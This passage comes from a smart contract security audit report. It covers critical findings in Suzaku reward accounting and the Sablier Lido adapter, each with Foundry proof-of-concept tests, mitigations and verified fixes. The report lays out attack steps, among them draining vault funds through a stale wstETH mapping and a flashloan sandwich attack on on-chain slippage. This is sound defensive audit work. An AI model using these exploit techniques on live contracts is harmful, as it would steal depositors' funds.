	// Track total stakes for each asset class
	uint256[] memory totalStakes = new uint256[](3); // [primary, secondary1, secondary2]

	for (uint256 i = 0; i < operators.length; i++) {
		address operator = operators[i];
		uint256 operatorStake = (totalStakePerClass * operatorPercentages[i]) / 100;
		uint256 stakePerNode = operatorStake / middleware.getOperatorNodes(operator).length;

		_setupOperatorStakes(epoch, operator, operatorStake, stakePerNode, totalStakes);
		_setupVaultDelegations(epoch, operator, operatorStake, timestamp);
		uptimeTracker.setOperatorUptimePerEpoch(epoch, operator, uptime);
	}

	// Set total stakes in L1 middleware
	middleware.setTotalStakeCache(epoch, 1, totalStakes[0]);
	middleware.setTotalStakeCache(epoch, 2, totalStakes[1]);
	middleware.setTotalStakeCache(epoch, 3, totalStakes[2]);
}

// Sets up stakes for a single operator's nodes and asset classes
function _setupOperatorStakes(
	uint48 epoch,
	address operator,
	uint256 operatorStake,
	uint256 stakePerNode,
	uint256[] memory totalStakes
) internal {
	bytes32[] memory operatorNodes = middleware.getOperatorNodes(operator);
	for (uint256 j = 0; j < operatorNodes.length; j++) {
		middleware.setNodeStake(epoch, operatorNodes[j], stakePerNode);
		totalStakes[0] += stakePerNode; // Primary stake
	}
	middleware.setOperatorStake(epoch, operator, 2, operatorStake);
	middleware.setOperatorStake(epoch, operator, 3, operatorStake);
	totalStakes[1] += operatorStake; // Secondary stake 1
	totalStakes[2] += operatorStake; // Secondary stake 2
}

// Sets up vault delegations for a single operator
function _setupVaultDelegations(
	uint48 epoch,
	address operator,
	uint256 operatorStake,
	uint256 timestamp
) internal {
	for (uint256 j = 0; j < delegators.length; j++) {
		delegators[j].setStake(
			middleware.L1_VALIDATOR_MANAGER(),
			uint96(j + 1),
			operator,
			uint48(timestamp),
			operatorStake
		);
	}
}
```

2. Add the following tests to the `RewardsTest.t.sol` file:
```solidity
function test_claimRewards_multipleTokens_staker() public {
	// Deploy a second reward token
	ERC20Mock rewardsToken2 = new ERC20Mock();
	rewardsToken2.mint(REWARDS_DISTRIBUTOR_ROLE, 1_000_000 * 10 ** 18);
	vm.prank(REWARDS_DISTRIBUTOR_ROLE);
	rewardsToken2.approve(address(rewards), 1_000_000 * 10 ** 18);
	uint48 startEpoch = 1;
	uint48 numberOfEpochs = 3;
	uint256 rewardsAmount = 100_000 * 10 ** 18;

	// Set rewards for both tokens
	vm.startPrank(REWARDS_DISTRIBUTOR_ROLE);
	rewards.setRewardsAmountForEpochs(startEpoch, numberOfEpochs, address(rewardsToken2), rewardsAmount);
	vm.stopPrank();

	// Setup staker
	address staker = makeAddr("Staker");
	address vault = vaultManager.vaults(0);
	uint256 epochTs = middleware.getEpochStartTs(startEpoch);
	MockVault(vault).setActiveBalance(staker, 300_000 * 1e18);
	MockVault(vault).setTotalActiveShares(uint48(epochTs), 400_000 * 1e18);

	// Distribute rewards for epochs 1 to 3
	for (uint48 epoch = startEpoch; epoch < startEpoch + numberOfEpochs; epoch++) {
		_setupStakes(epoch, 4 hours);
		vm.warp((epoch + 3) * middleware.EPOCH_DURATION());
		address[] memory operators = middleware.getAllOperators();
		vm.prank(REWARDS_DISTRIBUTOR_ROLE);
		rewards.distributeRewards(epoch, uint48(operators.length));
	}

	// Warp to epoch 4
	vm.warp((startEpoch + numberOfEpochs) * middleware.EPOCH_DURATION());

	// Claim for rewardsToken (should succeed)
	vm.prank(staker);
	rewards.claimRewards(address(rewardsToken), staker);
	assertGt(rewardsToken.balanceOf(staker), 0, "Staker should receive rewardsToken");

	// Try to claim for rewardsToken2 (should revert)
	vm.prank(staker);
	vm.expectRevert(abi.encodeWithSelector(IRewards.AlreadyClaimedForLatestEpoch.selector, staker, numberOfEpochs));
	rewards.claimRewards(address(rewardsToken2), staker);
}

function test_claimOperatorFee_multipleTokens_operator() public {
	// Deploy a second reward token
	ERC20Mock rewardsToken2 = new ERC20Mock();
	rewardsToken2.mint(REWARDS_DISTRIBUTOR_ROLE, 1_000_000 * 10 ** 18);
	vm.prank(REWARDS_DISTRIBUTOR_ROLE);
	rewardsToken2.approve(address(rewards), 1_000_000 * 10 ** 18);

	uint48 startEpoch = 1;
	uint48 numberOfEpochs = 3;
	uint256 rewardsAmount = 100_000 * 10 ** 18;

	// Set rewards for both tokens
	vm.startPrank(REWARDS_DISTRIBUTOR_ROLE);
	rewards.setRewardsAmountForEpochs(startEpoch, numberOfEpochs, address(rewardsToken2), rewardsAmount);
	vm.stopPrank();

	// Distribute rewards for epochs 1 to 3
	for (uint48 epoch = startEpoch; epoch < startEpoch + numberOfEpochs; epoch++) {
		_setupStakes(epoch, 4 hours);
		vm.warp((epoch + 3) * middleware.EPOCH_DURATION());
		address[] memory operators = middleware.getAllOperators();
		vm.prank(REWARDS_DISTRIBUTOR_ROLE);
		rewards.distributeRewards(epoch, uint48(operators.length));
	}

	// Warp to epoch 4
	vm.warp((startEpoch + numberOfEpochs) * middleware.EPOCH_DURATION());

	address operator = middleware.getAllOperators()[0];

	// Claim for rewardsToken (should succeed)
	vm.prank(operator);
	rewards.claimOperatorFee(address(rewardsToken), operator);
	assertGt(rewardsToken.balanceOf(operator), 0, "Operator should receive rewardsToken");

	// Try to claim for rewardsToken2 (should revert)
	vm.prank(operator);
	vm.expectRevert(abi.encodeWithSelector(IRewards.AlreadyClaimedForLatestEpoch.selector, operator, numberOfEpochs));
	rewards.claimOperatorFee(address(rewardsToken2), operator);
}

function test_claimCuratorFee_multipleTokens_curator() public {
	// Deploy a second reward token
	ERC20Mock rewardsToken2 = new ERC20Mock();
	rewardsToken2.mint(REWARDS_DISTRIBUTOR_ROLE, 1_000_000 * 10 ** 18);
	vm.prank(REWARDS_DISTRIBUTOR_ROLE);
	rewardsToken2.approve(address(rewards), 1_000_000 * 10 ** 18);

	uint48 startEpoch = 1;
	uint48 numberOfEpochs = 3;
	uint256 rewardsAmount = 100_000 * 10 ** 18;

	// Set rewards for both tokens
	vm.startPrank(REWARDS_DISTRIBUTOR_ROLE);
	rewards.setRewardsAmountForEpochs(startEpoch, numberOfEpochs, address(rewardsToken2), rewardsAmount);
	vm.stopPrank();

	// Distribute rewards for epochs 1 to 3
	for (uint48 epoch = startEpoch; epoch < startEpoch + numberOfEpochs; epoch++) {
		_setupStakes(epoch, 4 hours);
		vm.warp((epoch + 3) * middleware.EPOCH_DURATION());
		address[] memory operators = middleware.getAllOperators();
		vm.prank(REWARDS_DISTRIBUTOR_ROLE);
		rewards.distributeRewards(epoch, uint48(operators.length));
	}

	// Warp to epoch 4
	vm.warp((startEpoch + numberOfEpochs) * middleware.EPOCH_DURATION());

	address vault = vaultManager.vaults(0);
	address curator = MockVault(vault).owner();

	// Claim for rewardsToken (should succeed)
	vm.prank(curator);
	rewards.claimCuratorFee(address(rewardsToken), curator);
	assertGt(rewardsToken.balanceOf(curator), 0, "Curator should receive rewardsToken");

	// Try to claim for rewardsToken2 (should revert)
	vm.prank(curator);
	vm.expectRevert(abi.encodeWithSelector(IRewards.AlreadyClaimedForLatestEpoch.selector, curator, numberOfEpochs));
	rewards.claimCuratorFee(address(rewardsToken2), curator);
}
```

**Recommended Mitigation:** Change the `lastEpochClaimedStaker`, `lastEpochClaimedCurator` and `lastEpochClaimedOperator` mappings to be keyed by both the user address and the reward token, for example:

```solidity
mapping(address staker => mapping(address rewardToken => uint48 epoch)) public lastEpochClaimedStaker;
mapping(address curator => mapping(address rewardToken => uint48 epoch)) public lastEpochClaimedCurator;
mapping(address operator => mapping(address rewardToken => uint48 epoch)) public lastEpochClaimedOperator;
```

Update all relevant logic in the `claimRewards` function and elsewhere to use this new mapping structure, ensuring that claims are tracked separately for each reward token.

**Suzaku:**
Fixed in commit [43e09e6](https://github.com/suzaku-network/suzaku-core/pull/155/commits/43e09e66272b72b89e329403b10b0160938ad3b0).

**Cyfrin:** Verified.

## [C-2] Timestamp boundary condition causes reward dilution for active operators
- Severity: `Critical`
- Source report: `core.md`

### Detailed Content (from source)
**Description:** The `AvalancheL1Middleware::_wasActiveAt()` function contains a boundary condition bug that incorrectly treats operators and vaults as "active" at the exact timestamp when they are disabled. This causes disabled operators' stakes to be included in total stake calculations for reward distribution, leading to significant reward dilution for active operators.

The `_wasActiveAt()` function uses `>=` instead of `>` for the disabled time comparison:

```solidity
function _wasActiveAt(uint48 enabledTime, uint48 disabledTime, uint48 timestamp) private pure returns (bool) {
    return enabledTime != 0 && enabledTime <= timestamp && (disabledTime == 0 || disabledTime >= timestamp); //@audit disabledTime >= timestamp means an operator is active at a timestamp when he was disabled
 }
```

When `disabledTime == timestamp`, the operator is incorrectly considered active, even though they were disabled at that exact moment.


This bug affects the `calcAndCacheStakes()` function used for reward calculations. Note that if the operator was disabled exactly at epoch start, the `totalStake` returns an inflated value as it includes the stake of disabled operator.

```solidity
function calcAndCacheStakes(uint48 epoch, uint96 assetClassId) public returns (uint256 totalStake) {
    uint48 epochStartTs = getEpochStartTs(epoch);
    uint256 length = operators.length();

    for (uint256 i; i < length; ++i) {
        (address operator, uint48 enabledTime, uint48 disabledTime) = operators.atWithTimes(i);
        if (!_wasActiveAt(enabledTime, disabledTime, epochStartTs)) { // @audit: this gets skipped
            continue;
        }
        uint256 operatorStake = getOperatorStake(operator, epoch, assetClassId);
        operatorStakeCache[epoch][assetClassId][operator] = operatorStake;
        totalStake += operatorStake; // @audit -> this is inflated
    }
    totalStakeCache[epoch][assetClassId] = totalStake;
    totalStakeCached[epoch][assetClassId] = true;
}
```

The same `_wasActiveAt()` function is used in `getOperatorStake()` when iterating through vaults. If a vault is disabled exactly at epoch start, it's incorrectly included in the operator's stake calculation:

```solidity
function getOperatorStake(address operator, uint48 epoch, uint96 assetClassId) public view returns (uint256 stake) {
    uint48 epochStartTs = getEpochStartTs(epoch);
    uint256 totalVaults = vaultManager.getVaultCount();

    for (uint256 i; i < totalVaults; ++i) {
        (address vault, uint48 enabledTime, uint48 disabledTime) = vaultManager.getVaultAtWithTimes(i);

        // Skip if vault not active in the target epoch
        if (!_wasActiveAt(enabledTime, disabledTime, epochStartTs)) { // @audit: same boundary bug for vaults
            continue;
        }

        // Skip if vault asset not in AssetClassID
        if (vaultManager.getVaultAssetClass(vault) != assetClassId) {
            continue;
        }

        uint256 vaultStake = BaseDelegator(IVaultTokenized(vault).delegator()).stakeAt(
            L1_VALIDATOR_MANAGER, assetClassId, operator, epochStartTs, new bytes(0)
        );

        stake += vaultStake; // @audit -> inflated when disabled vaults are included
    }
}
```

In `Rewards::_calculateOperatorShare`, this inflated `totalStake` is then used to calculate operator share of rewards for that epoch.

```solidity
// In Rewards.sol - _calculateOperatorShare()
function _calculateOperatorShare(uint48 epoch, address operator) internal {
    // ...
    for (uint256 i = 0; i < assetClasses.length; i++) {
        uint256 operatorStake = l1Middleware.getOperatorUsedStakeCachedPerEpoch(epoch, operator, assetClasses[i]);
        uint256 totalStake = l1Middleware.totalStakeCache(epoch, assetClasses[i]); // @audit inflated value

        uint256 shareForClass = Math.mulDiv(
            Math.mulDiv(operatorStake, BASIS_POINTS_DENOMINATOR, totalStake), // @audit shares are diluted due to inflated total stake
            assetClassShare,
            BASIS_POINTS_DENOMINATOR
        );
        totalShare += shareForClass;
    }
    // ...
}
```

**Impact:** Rewards that were supposed to be distributed to active operators end up stuck in the Rewards contract. This leads to significant dilution of rewards for active operators and vaults.


**Proof of Concept:**
```solidity
   function test_wasActiveAtBoundaryBug() public {
        // create nodes for alice and charlie
        // Add nodes for Alice
        (bytes32[] memory aliceNodeIds,,) = _createAndConfirmNodes(alice, 1, 0, true);
        console2.log("Created", aliceNodeIds.length, "nodes for Alice");

        // Add nodes for Charlie
        (bytes32[] memory charlieNodeIds,,) = _createAndConfirmNodes(charlie, 1, 0, true);
        console2.log("Created", charlieNodeIds.length, "nodes for Charlie");

        // move to current epoch so that nodes are active
        // record next epoch start time stamp and epoch number
        uint48 currentEpoch = _calcAndWarpOneEpoch();
        uint48 nextEpoch = currentEpoch + 1;
        uint48 nextEpochStartTs = middleware.getEpochStartTs(nextEpoch);


        // Setup rewards contract (simplified version)
        address admin = makeAddr("admin");
        address protocolOwner = makeAddr("protocolOwner");
        address rewardsDistributor = makeAddr("rewardsDistributor");

        // Deploy rewards contract
        Rewards rewards = new Rewards();
        MockUptimeTracker uptimeTracker = new MockUptimeTracker();

        // Initialize rewards contract
        rewards.initialize(
            admin,
            protocolOwner,
            payable(address(middleware)),
            address(uptimeTracker),
            1000, // 10% protocol fee
            2000, // 20% operator fee
            1000, // 10% curator fee
            11520 // min required uptime
        );

        // Setup roles
        vm.prank(admin);
        rewards.setRewardsDistributorRole(rewardsDistributor);

        // Create rewards token and set rewards
        ERC20Mock rewardsToken = new ERC20Mock();
        uint256 totalRewards = 100 ether;
        rewardsToken.mint(rewardsDistributor, totalRewards);

         vm.startPrank(rewardsDistributor);
        rewardsToken.approve(address(rewards), totalRewards);
        rewards.setRewardsAmountForEpochs(nextEpoch, 1, address(rewardsToken), totalRewards);
        vm.stopPrank();

        // Set rewards share for primary asset class
        vm.prank(admin);
        rewards.setRewardsShareForAssetClass(1, 10000); // 100% for primary asset class

        // Record initial stake
        uint256 aliceInitialStake = middleware.getOperatorStake(alice, currentEpoch, assetClassId);
        uint256 charlieInitialStake = middleware.getOperatorStake(charlie, currentEpoch, assetClassId);

        // Verify they have nodes
        bytes32[] memory aliceCurrentNodes = middleware.getActiveNodesForEpoch(alice, currentEpoch);
        bytes32[] memory charlieCurrentNodes = middleware.getActiveNodesForEpoch(charlie, currentEpoch);
        console2.log("Alice current nodes:", aliceCurrentNodes.length);
        console2.log("Charlie current nodes:", charlieCurrentNodes.length);

        console2.log("=== INITIAL STATE ===");
        console2.log("Alice initial stake:", aliceInitialStake);
        console2.log("Charlie initial stake:", charlieInitialStake);
        console2.log("Total initial:", aliceInitialStake + charlieInitialStake);


        // Move to exact epoch boundary and disable Alice
        vm.warp(nextEpochStartTs);
        vm.prank(validatorManagerAddress);
        middleware.disableOperator(alice);

        // Set uptime alice - 0, charlie - full
        uptimeTracker.setOperatorUptimePerEpoch(nextEpoch, alice, 0 hours);
        uptimeTracker.setOperatorUptimePerEpoch(nextEpoch, charlie, 4 hours);

        // Calculate stakes for the boundary epoch
        uint256 aliceBoundaryStake = middleware.getOperatorStake(alice, nextEpoch, assetClassId);
        uint256 charlieBoundaryStake = middleware.getOperatorStake(charlie, nextEpoch, assetClassId);
        uint256 totalBoundaryStake = middleware.calcAndCacheStakes(nextEpoch, assetClassId);

        console2.log("=== BOUNDARY EPOCH ===");
        console2.log("Epoch start timestamp:", nextEpochStartTs);
        console2.log("Alice disabled at timestamp:", nextEpochStartTs);
        console2.log("Alice boundary stake:", aliceBoundaryStake);
        console2.log("Charlie boundary stake:", charlieBoundaryStake);
        console2.log("Total boundary stake:", totalBoundaryStake);


       // Distribute rewards using actual Rewards contract
        vm.warp(nextEpochStartTs + 3 * middleware.EPOCH_DURATION()); // Move past distribution window

        vm.prank(rewardsDistributor);
        rewards.distributeRewards(nextEpoch, 10); // Process all operators

        // Move to claiming period
        vm.warp(nextEpochStartTs + 4 * middleware.EPOCH_DURATION());

        // Record balances before claiming
        uint256 rewardsContractBalance = rewardsToken.balanceOf(address(rewards));
        uint256 charlieBalanceBefore = rewardsToken.balanceOf(charlie);

        console2.log("=== UNDISTRIBUTED REWARDS TEST ===");
        console2.log("Total rewards in contract:", rewardsContractBalance);

        // Charlie claims his rewards
        vm.prank(charlie);
        rewards.claimOperatorFee(address(rewardsToken), charlie);

        uint256 charlieRewards = rewardsToken.balanceOf(charlie) - charlieBalanceBefore;
        console2.log("Charlie claimed:", charlieRewards);

        // Alice cannot claim (disabled/no uptime)
        vm.expectRevert();
        vm.prank(alice);
        rewards.claimOperatorFee(address(rewardsToken), alice);

        // Charlie should get 100% of operator rewards
        // Deduct protocol share - and calculate operator fees
        uint256 charliExpectedRewards = totalRewards * 9000 * 2000 / 100_000_000; // (total rewards - protocol share) * operator fee
        assertGt(charliExpectedRewards, charlieRewards);
    }
```

**Recommended Mitigation:** Consider changing the boundary condition in `_wasActiveAt()` to exclude operators disabled at exact timestamp.

**Suzaku:**
Fixed in commit [9bbbcfc](https://github.com/suzaku-network/suzaku-core/pull/155/commits/9bbbcfce7bedd1dd4e60fdf55bb5f13ba8ab4847).

**Cyfrin:** Verified.

## [C-3] Adapter vault `_user Wst ETH` not cleared after redemption enables theft of other users' funds
- Severity: `Critical`
- Source report: `escrow.md`

### Detailed Content (from source)
**Description:** When a user redeems shares from an adapter vault via `SablierBob::redeem`, their shares are burned but the `_userWstETH` mapping in `SablierLidoAdapter` is never cleared or decremented. This contrasts with `SablierBob::exitWithinGracePeriod` which correctly clears `_userWstETH` and decrements `_vaultTotalWstETH`.

The root cause is in `BobVaultShare::_update` (`BobVaultShare.sol:107-118`):
```solidity
if (from != address(0) && to != address(0)) {
    ISablierBob(SABLIER_BOB).onShareTransfer(VAULT_ID, from, to, amount, fromBalanceBefore);
}
```
Burns (where `to == address(0)`) do not trigger `SablierBob::onShareTransfer`, so `SablierLidoAdapter::updateStakedTokenBalance` is never called. And `SablierLidoAdapter::calculateAmountToTransferWithYield` (`SablierLidoAdapter.sol:153-193`) is a `view` function that reads `_userWstETH` but never modifies it.

In `redeem` (`SablierBob.sol:290-373`), the flow is:
1. Burn shares (line 323) — `_userWstETH` NOT cleared
2. Unstake if needed (lines 328-334)
3. Call `calculateAmountToTransferWithYield` (line 338-339) — reads stale `_userWstETH`
4. Transfer tokens (line 369)

Compare with `exitWithinGracePeriod` which calls `SablierLidoAdapter::unstakeForUserWithinGracePeriod` (`SablierLidoAdapter.sol:290-306`):
```solidity
_userWstETH[vaultId][user] = 0;           // CLEARED
_vaultTotalWstETH[vaultId] -= userWstETH; // DECREMENTED
```

**Impact:** An attacker controlling two addresses can steal WETH from other depositors in the same vault:

1. Attacker A, attacker B, and victim C each deposit 100 WETH into an adapter vault. State: `_userWstETH[A]=100`, `_userWstETH[B]=100`, `_userWstETH[C]=100`, `_vaultTotalWstETH=300`
2. Vault settles/expires. `unstakeFullAmount` converts 300 wstETH to 330 WETH (includes yield). `_wethReceivedAfterUnstaking=330`
3. A calls `redeem`: shares burned, `calculateAmountToTransferWithYield` computes `userWethShare = 100 * 330 / 300 = 110`. A receives ~110 WETH. **But `_userWstETH[A]` is still 100**
4. B transfers all shares to A via ERC20 transfer. `updateStakedTokenBalance` moves B's 100 wstETH to A. Now `_userWstETH[A] = 100 (stale) + 100 (transferred) = 200`
5. A calls `redeem` again with B's shares: `userWethShare = 200 * 330 / 300 = 220`. A receives ~220 WETH
6. Total attacker receives: ~110 + ~220 = ~330 WETH (all vault funds). Victim C's `redeem` reverts — no WETH remains

**Proof of Concept:** Add the following test to `tests/bob/integration/concrete/redeem/redeemPoC.t.sol`:

```solidity
/// When a user redeems from an adapter vault, shares are burned but _userWstETH in the
/// adapter is NEVER cleared. An attacker with two addresses can:
/// 1. Redeem from address A (wstETH tracking persists despite shares being burned)
/// 2. Transfer shares from address B to A (wstETH compounds on stale data)
/// 3. Redeem again from A with inflated wstETH ratio, draining other users' funds
function test_PoC_StaleUserWstETH_FundTheft() external {
    uint256 vaultId = createVaultWithAdapter();
    uint128 amount = WETH_DEPOSIT_AMOUNT; // 1e18

    // Three users deposit: depositor (attacker A), depositor2 (attacker B), alice (victim)
    setMsgSender(users.depositor);
    bob.enter(vaultId, amount);
    uint128 wstETH_initial = adapter.getYieldBearingTokenBalanceFor(vaultId, users.depositor);

    setMsgSender(users.depositor2);
    bob.enter(vaultId, amount);

    setMsgSender(users.alice);
    bob.enter(vaultId, amount);

    // Simulate yield: lower wstETH rate = more stETH per wstETH when unwrapping
    wsteth.setExchangeRate(0.818e18);

    // Warp past expiry and unstake
    vm.warp(EXPIRY + 1);
    bob.unstakeTokensViaAdapter(vaultId);

    uint256 totalWeth = adapter.getWethReceivedAfterUnstaking(vaultId);
    assertGt(totalWeth, 3e18, "yield should produce > 3 WETH from 3 deposits");

    // Attacker A redeems
    setMsgSender(users.depositor);
    uint256 wethBefore = IERC20(address(weth)).balanceOf(users.depositor);
    bob.redeem(vaultId);
    uint256 firstRedeem = IERC20(address(weth)).balanceOf(users.depositor) - wethBefore;

    // *** BUG: _userWstETH is NOT cleared after redeem ***
    assertEq(
        adapter.getYieldBearingTokenBalanceFor(vaultId, users.depositor),
        wstETH_initial,
        "BUG: _userWstETH unchanged after redeem (should be 0)"
    );

    // Attacker B transfers all shares to attacker A
    setMsgSender(users.depositor2);
    IERC20 shareToken = IERC20(address(bob.getShareToken(vaultId)));
    shareToken.transfer(users.depositor, shareToken.balanceOf(users.depositor2));

    // wstETH[A] = stale_amount + transferred_amount = INFLATED
    assertGt(
        adapter.getYieldBearingTokenBalanceFor(vaultId, users.depositor),
        wstETH_initial,
        "BUG: wstETH inflated from stale + transferred"
    );

    // Attacker A redeems AGAIN with inflated wstETH
    setMsgSender(users.depositor);
    wethBefore = IERC20(address(weth)).balanceOf(users.depositor);
    bob.redeem(vaultId);
    uint256 secondRedeem = IERC20(address(weth)).balanceOf(users.depositor) - wethBefore;

    // Attacker received more than their legitimate 2/3 share
    assertGt(
        firstRedeem + secondRedeem,
        (totalWeth * 2) / 3,
        "EXPLOIT: attacker received more than legitimate 2/3 share"
    );

    // Victim alice tries to redeem - REVERTS because WETH was drained
    setMsgSender(users.alice);
    assertGt(shareToken.balanceOf(users.alice), 0, "alice still has shares");
    vm.expectRevert();
    bob.redeem(vaultId);
}
```

Run with: `forge test --match-test test_PoC_StaleUserWstETH_FundTheft -vvv`

**Recommended Mitigation:** Add a state-changing function in the adapter to clear `_userWstETH` after redemption, and call it from `redeem`:

```solidity
// In SablierLidoAdapter, add:
function clearUserWstETH(uint256 vaultId, address user) external onlySablierBob {
    uint128 userWstETH = _userWstETH[vaultId][user];
    _userWstETH[vaultId][user] = 0;
    _vaultTotalWstETH[vaultId] -= userWstETH;
}

// In SablierBob::redeem, after calculateAmountToTransferWithYield:
vault.adapter.clearUserWstETH(vaultId, msg.sender);
```

Alternatively, change `calculateAmountToTransferWithYield` from a `view` function to a state-changing function that clears the user's wstETH data.

**Sablier:** Fixed in commit [e7b4f7f](https://github.com/sablier-labs/lockup/commit/e7b4f7f22fa838da70d36e7555570fc3032f9705). The old `calculateAmountToTransferWithYield` view function has been replaced with `SablierLidoAdapter::processRedemption`, which is a state-changing function called from `SablierBob::redeem` that explicitly clears the user's `wstETH`.

The redeem flow also now burns shares after `processRedemption` so the `wstETH` data is consumed before the burn.

**Cyfrin:** Verified.


\clearpage
## High Risk

## [C-4] Circular slippage protection in `Sablier Lido Adapter::_wst ETHTo Weth` enables sandwich attacks on adapter vault unstaking
- Severity: `Critical`
- Source report: `escrow.md`

### Detailed Content (from source)
**Description:** In `SablierLidoAdapter::_wstETHToWeth` (`SablierLidoAdapter.sol:367-389`), the minimum acceptable output for the Curve swap is derived from `get_dy` — a view function that returns the expected output based on the pool's **current reserves**:

```solidity
uint256 expectedEthOut = ICurveStETHPool(CURVE_POOL).get_dy(1, 0, stETHAmount);
uint256 minEthOut = ud(expectedEthOut).mul(UNIT.sub(slippageTolerance)).unwrap();
uint256 ethReceived = ICurveStETHPool(CURVE_POOL).exchange(1, 0, stETHAmount, minEthOut);
```

The Curve stETH/ETH pool's [`get_dy`](https://github.com/curvefi/curve-contract/blob/master/contracts/pools/steth/StableSwapSTETH.vy#L419-L425) reads the current pool balances via `self._balances()` to compute its output:

```vyper
@view
@external
def get_dy(i: int128, j: int128, dx: uint256) -> uint256:
    xp: uint256[N_COINS] = self._balances()   # reads CURRENT reserves
    x: uint256 = xp[i] + dx
    y: uint256 = self.get_y(i, j, x, xp)
    dy: uint256 = xp[j] - y - 1
    fee: uint256 = self.fee * dy / FEE_DENOMINATOR
    return dy - fee
```

The `exchange` function uses the same `self._balances()` pattern. Since both functions read the current reserve state and execute in the same transaction, if an attacker manipulates the pool reserves before the transaction, `get_dy` returns a value reflecting the manipulated state, and the slippage tolerance (max 5%) is applied to the already-depressed price. The protection is circular — it only guards against price movement *between* `get_dy` and `exchange` within the same atomic transaction, which is always zero. This is a [known vulnerability pattern with on-chain slippage calculation](https://dacian.me/defi-slippage-attacks#heading-on-chain-slippage-calculation-can-be-manipulated). The manipulability of Curve's `get_dy` on the same stETH/ETH pool was also [confirmed as a high-severity finding in the Tapioca DAO audit](https://code4rena.com/reports/2023-07-tapioca#h-08-lidoethstrategy_currentbalance-is-subject-to-price-manipulation-allows-overborrowing-and-liquidations) where `get_dy(1, 0, stEthBalance)` was used identically.

`SablierBob::unstakeTokensViaAdapter` (`SablierBob.sol:425-468`) is permissionless — anyone can call it once a vault is settled or expired. This means the attacker controls exactly when the unstaking occurs and can sandwich their own call:

1. **Front-run**: Flashloan a large amount of stETH, dump it into the Curve pool → pushes down the stETH/ETH exchange rate
2. **Call `unstakeTokensViaAdapter`**: `get_dy` reads the manipulated reserves and returns a depressed `expectedEthOut`. `minEthOut` = depressed price * 95% — an even lower threshold. `exchange` executes at the manipulated rate and passes the check
3. **Back-run**: Buy back stETH cheaply from the now-imbalanced pool → profit from the price recovery

The damage is amplified because `_wethReceivedAfterUnstaking` is written once during `unstakeFullAmount` (`SablierLidoAdapter.sol:322`) and used as the denominator for **all subsequent user redemptions**. A single sandwich attack permanently reduces every user's WETH payout for that vault.

The same vulnerability applies to `unstakeForUserWithinGracePeriod` (`SablierLidoAdapter.sol:290-306`), which uses the same `_wstETHToWeth` function. While this path is only callable by `SablierBob` (not directly by the attacker), the user's `exitWithinGracePeriod` transaction can still be sandwiched in the mempool.

**Impact:** An attacker can steal a portion of every adapter vault's WETH during unstaking. The attack requires no special permissions — `unstakeTokensViaAdapter` is permissionless, so the attacker controls the timing perfectly. The profit equals the difference between the fair stETH/ETH rate and the manipulated rate, minus flashloan fees and gas. For large vaults, this can be substantial.

The 5% max slippage tolerance (`MAX_SLIPPAGE_TOLERANCE = 0.05e18`) caps the per-vault loss at ~5% of total staked value, but this is applied to every adapter vault that gets unstaked. Since the attacker can monitor all vault settlements and sandwich each one, the cumulative loss across the protocol can be significant.

**Proof of Concept:** The PoC requires a small backward-compatible addition to `MockCurvePool` in `tests/bob/mocks/MockLido.sol` — a `poolManipulationBps` variable that affects both `get_dy` and `exchange`, simulating an attacker skewing the pool's reserves via flashloan. When set, both functions return depressed values (matching real Curve behavior where spot price queries and swaps read the same reserves):
```diff
@ bob/tests/bob/mocks/MockLido.sol:109 @ contract MockCurvePool is ICurveStETHPool {
    /// @dev Slippage in basis points (e.g., 100 = 1% less than expected).
    uint256 public actualSlippage;

+   /// @dev Pool manipulation in basis points — simulates an attacker skewing reserves.
+   /// Affects BOTH get_dy and exchange (the spot price the pool reports).
+   uint256 public poolManipulationBps;

    constructor(address stETH_) {
        STETH = stETH_;
    }
@ bob/tests/bob/mocks/MockLido.sol:120 @ contract MockCurvePool is ICurveStETHPool {
    function exchange(int128, int128, uint256 dx, uint256) external payable override returns (uint256) {
        IStETH(STETH).transferFrom(msg.sender, address(this), dx);

-       // Calculate actual output with slippage simulation.
-       uint256 actualOutput = (dx * (10_000 - actualSlippage)) / 10_000;
+      // Calculate actual output with pool manipulation and slippage simulation.
+       uint256 actualOutput = dx;
+       if (poolManipulationBps > 0) {
+           actualOutput = (actualOutput * (10_000 - poolManipulationBps)) / 10_000;
+       }
+       if (actualSlippage > 0) {
+           actualOutput = (actualOutput * (10_000 - actualSlippage)) / 10_000;
+       }

        (bool success,) = msg.sender.call{ value: actualOutput }("");
        require(success, "ETH transfer failed");
        return actualOutput;
    }

-   function get_dy(int128, int128, uint256 dx) external pure override returns (uint256) {
-       // Always returns the expected 1:1 rate (no slippage in the quote).
+   function get_dy(int128, int128, uint256 dx) external view override returns (uint256) {
+       // When pool is manipulated, get_dy reflects the manipulated reserves.
+       if (poolManipulationBps > 0) {
+           return (dx * (10_000 - poolManipulationBps)) / 10_000;
+       }
        return dx;
    }

@ bob/tests/bob/mocks/MockLido.sol:148 @ contract MockCurvePool is ICurveStETHPool {
        actualSlippage = slippageBps;
    }

+   /// @notice Simulates an attacker manipulating pool reserves (e.g., via flashloan).
+   /// Affects both get_dy and exchange, modeling how a real sandwich attack works.
+   /// @param bps Manipulation in basis points (e.g., 400 = 4% price depression).
+   function setPoolManipulation(uint256 bps) external {
+       poolManipulationBps = bps;
+   }

    receive() external payable { }
}
```

Add the following test to `tests/bob/integration/concrete/unstake-full-amount/unstakeFullAmountPoC.t.sol`:

```solidity
/// Demonstrates a sandwich attack on unstakeTokensViaAdapter:
/// 1. Normal path: unstake without pool manipulation → fair WETH received
/// 2. Sandwich path: attacker manipulates pool reserves before unstaking →
///    get_dy returns depressed price, minEthOut is derived from depressed price,
///    exchange executes at depressed price and PASSES the slippage check
/// 3. Compare: sandwich path yields significantly less WETH, permanently
///    reducing _wethReceivedAfterUnstaking for all users in the vault
function test_PoC_SandwichAttackOnUnstaking() external {
    // Setup: create adapter vault, three users deposit 10 WETH each
    uint256 vaultId = createVaultWithAdapter();
    uint128 depositAmount = 10e18;

    setMsgSender(users.depositor);
    bob.enter(vaultId, depositAmount);

    setMsgSender(users.depositor2);
    bob.enter(vaultId, depositAmount);

    setMsgSender(users.alice);
    bob.enter(vaultId, depositAmount);

    // Total deposited: 30 WETH. Warp past expiry
    vm.warp(EXPIRY + 1);

    // ====== SNAPSHOT ======
    uint256 snapshotId = vm.snapshot();

    // ====== NORMAL PATH: unstake without manipulation ======
    bob.unstakeTokensViaAdapter(vaultId);
    uint256 normalWethReceived = adapter.getWethReceivedAfterUnstaking(vaultId);

    // ====== REVERT TO SNAPSHOT ======
    vm.revertTo(snapshotId);

    // ====== SANDWICH PATH: attacker manipulates pool before unstaking ======
    // Simulate attacker front-running: dumps stETH into Curve pool,
